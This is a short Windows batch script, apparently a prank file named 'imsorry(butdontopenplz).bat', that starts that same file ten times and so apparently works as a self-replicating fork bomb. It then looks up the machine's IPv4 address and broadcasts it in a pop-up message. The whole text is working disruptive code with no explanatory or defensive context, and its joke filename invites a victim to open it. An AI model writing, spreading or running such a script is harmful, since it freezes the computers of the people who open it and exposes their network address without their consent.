@echo off
start imsorry(butdontopenplz).bat
start imsorry(butdontopenplz).bat
start imsorry(butdontopenplz).bat
start imsorry(butdontopenplz).bat
start imsorry(butdontopenplz).bat
start imsorry(butdontopenplz).bat
start imsorry(butdontopenplz).bat
start imsorry(butdontopenplz).bat
start imsorry(butdontopenplz).bat
start imsorry(butdontopenplz).bat
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
msg * %NetworkIP%
